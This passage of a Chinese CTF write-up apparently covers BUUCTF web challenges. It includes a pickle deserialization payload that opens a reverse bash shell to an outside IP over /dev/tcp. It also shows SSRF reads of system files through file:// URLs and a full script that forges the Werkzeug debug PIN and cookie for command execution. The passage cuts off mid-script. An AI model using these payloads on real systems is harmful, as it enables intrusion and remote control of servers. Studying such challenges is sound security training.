selector\">%78</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%74</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%75</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%42</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%67</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%7d</span> HTTP/1.1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token property\">Host</span><span class=\"token punctuation\">:</span> eb3e8812-05d3-4279-bb7f-70858fa62d3c.node4.buuoj.<span class=\"token property\">cn</span><span class=\"token punctuation\">:</span>81</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token property\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> 1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token property\">User-Agent</span><span class=\"token punctuation\">:</span> Mozilla/5.0 <span class=\"token punctuation\">(</span>Windows NT 10.0<span class=\"token punctuation\">;</span> Win64<span class=\"token punctuation\">;</span> x64<span class=\"token punctuation\">)</span> AppleWebKit/537.36 <span class=\"token punctuation\">(</span>KHTML<span class=\"token punctuation\">,</span> like Gecko<span class=\"token punctuation\">)</span> Chrome/120.0.0.0 Safari/537.36</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token property\">Accept-Encoding</span><span class=\"token punctuation\">:</span> gzip<span class=\"token punctuation\">,</span> deflate</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token property\">Accept</span><span class=\"token punctuation\">:</span> text/html<span class=\"token punctuation\">,</span>application/xhtml+xml<span class=\"token punctuation\">,</span>application/xml<span class=\"token punctuation\">;</span>q=0.9<span class=\"token punctuation\">,</span>image/avif<span class=\"token punctuation\">,</span>image/webp<span class=\"token punctuation\">,</span>image/apng<span class=\"token punctuation\">,</span>*/*<span class=\"token punctuation\">;</span>q=0.8<span class=\"token punctuation\">,</span>application/signed-exchange<span class=\"token punctuation\">;</span>v=b3<span class=\"token punctuation\">;</span>q=0.7</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token property\">Accept-Language</span><span class=\"token punctuation\">:</span> zh-CN<span class=\"token punctuation\">,</span>zh<span class=\"token punctuation\">;</span>q=0.9</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token property\">Cookie</span><span class=\"token punctuation\">:</span> session=eyJyb2xlIjoiZ3Vlc3QifQ.ZYrMjg.PjZ4b12BWufas7uBClStAdJGT3w</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token property\">Cache-Control</span><span class=\"token punctuation\">:</span> max-age=0</pre></td></tr></table></figure><p>发送后，这里得到的结果就是 admin 身份。</p>\n<p>session=eyJyb2xlIjoiYWRtaW4ifQ.ZYrPlg.Z0wq21JYJfDmPWsFqt7L6aeL9Gc</p>\n<p>接着就可以触发 pickle 反序列化，反弹 shell</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token string\">b\"(cos\\nsystem\\nS'bash -c \\\"bash -i >&amp; /dev/tcp/1.94.24.55/6666 0>&amp;1\\\"'\\no\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>payload<span class=\"token operator\">=</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"../../../images/Iknowyouwillstop/27.png\" alt=\"27\" /></p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/28.png\" alt=\"28\" /></p>\n<p>最终得到 flag</p>\n<p><img data-src=\"../../../images/Iknowyouwillstop/29.png\" alt=\"29\" /></p>\n<h3 id=\"pppython\"><a class=\"anchor\" href=\"#pppython\">#</a> pppython?</h3>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'hint'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"your?\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"mine!\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"hint!!\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Content-type: text/plain\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ls / -la\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$ch</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_CONNECTTIMEOUT</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_HTTPHEADER</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'lolita'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token variable\">$output</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$output</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Error</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">highlight_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token operator\">-></span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?></span></span> curl_setopt(): The CURLOPT_HTTPHEADER option must have an array value</pre></td></tr></table></figure><p>先传值看看 hint:</p>\n<blockquote>\n<p>?hint[0]=your%3F&amp;hint[1]=mine!&amp;hint[2]=hint!!</p>\n</blockquote>\n<p><img data-src=\"../../../images/Iknowyouwillstop/30.png\" alt=\"30\" /></p>\n<p>明显要利用 ssrf 漏洞，关于 ssrf 可以参考以下文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbWlydWllci9wLzEzOTA3MTUwLmh0bWw=\">SSRF 漏洞（原理、挖掘点、漏洞利用、修复建议） </span></p>\n<p>看完后再分析上面的结果可以发现，/flag 文件又需要提权。</p>\n<p>但我们也发现存在 app.py 文件，兴许有什么提示。</p>\n<blockquote>\n<p>/?url=file:///app.py&amp;lolita[]=1</p>\n</blockquote>\n<p>这里为了防止报错 lolita 一定要是数组。</p>\n<p>这是由于：</p>\n<blockquote>\n<p>在  <code>curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST['lolita']);</code>  中， <code>$_REQUEST['lolita']</code>  期望是一个数组的原因在于 HTTP 头信息的格式。</p>\n<p><code>CURLOPT_HTTPHEADER</code>  选项用于设置 HTTP 请求头信息，这些信息需要以数组的形式提供给 cURL 函数。通常情况下，HTTP 头信息是由键值对组成的数组，每个键值对表示一个单独的头部字段和对应的值。</p>\n<p>所以，如果  <code>$_REQUEST['lolita']</code>  被用来设置 HTTP 头信息，它应该是一个包含多个键值对的数组，每个元素代表一个头部字段。每个元素可能是以键值对形式构成的数组，或者是一个字符串，形式类似于  <code>['HeaderName: HeaderValue', 'AnotherHeader: AnotherValue']</code> 。这种格式能够被  <code>curl_setopt()</code>  正确地解析并设置为请求头信息。</p>\n<p>确保  <code>$_REQUEST['lolita']</code>  是数组形式是为了让 cURL 函数能够正确地将每个元素解析为独立的头部字段，并将它们作为请求的一部分发送给远程服务器。</p>\n</blockquote>\n<p>得到结果：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from flask import Flask<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> render_template<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>render_template_string import os<span class=\"token punctuation\">,</span> base64 </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>#from NeepuF1Le import neepu_files </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>app = <span class=\"token function\">Flask</span><span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>app.config[<span class=\"token string\">'SECRET_KEY'</span>] = <span class=\"token string\">'******'</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>@app.<span class=\"token function\">route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>def <span class=\"token function\">welcome</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    if session[<span class=\"token string\">\"islogin\"</span>] <span class=\"token operator\">==</span> <span class=\"token property\">True</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    return <span class=\"token string\">\"flag&#123;***********************&#125;\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>app.<span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> 1314<span class=\"token punctuation\">,</span> debug=True<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    1</pre></td></tr></table></figure><p>这里伪造 session 能得到 flag，但是根本没有 cookie，伪造不了，题目也提示了。但是可以发现 debug 开启监听在 1314 端口，那么结合 CURLOPT_HTTPHEADER 包含头部信息，我们可以计算 pin 码手动生成 cookie 然后上传用于身份验证，从而命令执行</p>\n<p>PIN 的生成流程分析，可以知道 PIN 主要由 probably_public_bits 和 private_bits 两个列表变量决定，而这两个列表变量又由如下 6 个变量决定：</p>\n<blockquote>\n<p>username 启动这个 Flask 的用户<br />\n modname 一般默认 flask.app<br />\ngetattr (app, '__name__', getattr (app.__class__, '__name__')) 一般默认 flask.app 为 Flask<br />\ngetattr (mod, '__file__', None) 为 flask 目录下的一个 <span class=\"exturl\" data-url=\"aHR0cDovL2FwcC5weQ==\">app.py</span> 的绝对路径，可在爆错页面看到<br />\n str (uuid.getnode ()) 则是网卡 MAC 地址的十进制表达式<br />\n get_machine_id () 系统 id</p>\n</blockquote>\n<p>关于如何计算 pin 值可以参考以下文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NzgyMDU1L2FydGljbGUvZGV0YWlscy8xMjkxMjY4MjU=\">关于 ctf 中 flask 算 pin 总结</span></p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDA0MjI1NDYyNg==\">深入浅出 Flask PIN</span></p>\n<p>绝对路径可以在报错界面看到：</p>\n<blockquote>\n<p>File &quot;/usr/local/lib/python3.10/dist-packages/flask/sessions.py&quot;</p>\n</blockquote>\n<ul>\n<li>接着获取网卡 MAC 地址</li>\n</ul>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?url=<span class=\"token property\">file</span><span class=\"token punctuation\">:</span><span class=\"token comment\">///sys/class/net/eth0/address&amp;lolita[]=</span></pre></td></tr></table></figure><blockquote>\n<p>d2:8e:ac:50:fb:2b</p>\n</blockquote>\n<p>转换为 10 进制：</p>\n<blockquote>\n<p>231510218177323</p>\n</blockquote>\n<p>最后的系统 id 包括两部分，我们先读取 /etc/machine-id（也可以是 /proc/sys/kernel/random/boot_id）</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?url=<span class=\"token property\">file</span><span class=\"token punctuation\">:</span><span class=\"token comment\">///proc/sys/kernel/random/boot_id&amp;lolita[]=</span></pre></td></tr></table></figure><p>然后取 /proc/self/cgroup 并且只读取第一行，并以从右边算起的第一个 / 为分隔符</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?url=<span class=\"token property\">file</span><span class=\"token punctuation\">:</span><span class=\"token comment\">///proc/self/cgroup&amp;lolita[]=</span></pre></td></tr></table></figure><p>最后利用以下脚本计算 pin 值和 cookie:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> chain</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>probably_public_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">'root'</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string\">'flask.app'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">'Flask'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">'/usr/local/lib/python3.10/site-packages/flask/app.py'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>private_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token string\">'231510218177323'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token string\">'8cab9c97-85be-4fb4-9d17-29335d7b2b8adocker-9b6d88956e6dfc0c085fc6e499d5370a6ad3b43f93f022704862b1cc1c00673b.scope'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>h <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> bit <span class=\"token keyword\">in</span> chain<span class=\"token punctuation\">(</span>probably_public_bits<span class=\"token punctuation\">,</span> private_bits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> bit<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        bit <span class=\"token operator\">=</span> bit<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>bit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b'cookiesalt'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>cookie_name <span class=\"token operator\">=</span> <span class=\"token string\">'__wzd'</span> <span class=\"token operator\">+</span> h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">if</span> num <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    h<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token string\">b'pinsalt'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    num <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'%09d'</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>rv <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">if</span> rv <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">for</span> group_size <span class=\"token keyword\">in</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> group_size <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            rv <span class=\"token operator\">=</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">:</span>x <span class=\"token operator\">+</span> group_size<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span>group_size<span class=\"token punctuation\">,</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                          <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> group_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        rv <span class=\"token operator\">=</span> num</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">hash_pin</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>sha1<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>pin<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> added salt\"</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"replace\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cookie_name <span class=\"token operator\">+</span> <span class=\"token string\">\"=\"</span> <span class=\"token operator\">+</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">|</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>hash_pin<span class=\"token punctuation\">(</span>rv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>611-381-128</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>__wzd3f0f8cc7b9df7da1ff0f=1703763901|9f2ebc51b92e</pre></td></tr></table></figure><p>然后就是如何传参</p>\n<blockquote>\n<p>GET /?&amp;__debugger__=yes&amp;cmd=print(1)&amp;frm=140324285712640&amp;s=prj74Iraob1k5eMHiH37</p>\n<p>这里我们要去获取 frm 和 s 的值</p>\n</blockquote>\n<p>frm 如果没有报错信息的话值为 0<br />\ns 的值可以直接访问./console，然后查看源码的 SECRET 值<br />\n由于这里试了半天没有报错信息，那么 frm=0</p>\n<blockquote>\n<p>访问一下 console，获取 s 值<br />\n Dmrc3kenoS8c1avbeKAc</p>\n</blockquote>\n<p>最后贴下官方的源码：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> chain</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>probably_public_bits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string\">'root'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># /etc/passwd, /etc/shadow 验证</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string\">'flask.app'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 默认值</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">'Flask'</span><span class=\"token punctuation\">,</span>  <span class=\"token comment\"># 默认值</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string\">'/usr/local/lib/python3.10/dist-packages/flask/app.py'</span>  <span class=\"token comment\"># 报错得到</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>bid <span class=\"token operator\">=</span> <span class=\"token string\">\"8cab9c97-85be-4fb4-9d17-29335d7b2b8a\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>did <span class=\"token operator\">=</span> <span class=\"token string\">\"12:hugetlb:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-pod61c1a41a_fad4_4aef_aaf4_d80d76471207.slice/docker-d322291672ad2300fe0ea03039489c933eeb720fa5d824926aa8d4d1ba8e18d0.scope\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>did <span class=\"token operator\">=</span> did<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rpartition<span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span 